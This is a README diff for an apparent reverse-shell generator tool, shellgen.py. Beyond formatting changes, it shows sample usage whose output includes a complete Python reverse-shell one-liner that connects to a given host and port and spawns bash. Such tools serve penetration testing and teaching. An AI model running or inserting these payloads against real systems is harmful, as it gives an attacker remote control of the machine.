@@ -20,11 +20,11 @@
  
 
 ## Samples 
-- basic usage uses the three default methods, bash python3, and nc and default port l337
+#### basic usage uses the three default methods, bash python3, and nc and default port l337
 
     
     python3 shellgen.py 127.0.0.1
-
+    
     ['bash', 'python3', 'nc']
     
     bash: 
@@ -35,7 +35,7 @@
     python3: 
       export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
 
-- specifying a method and port
+#### specifying a method and port
     
     python3 shellgen.py 127.0.0.1 -m bash -p 9001
 
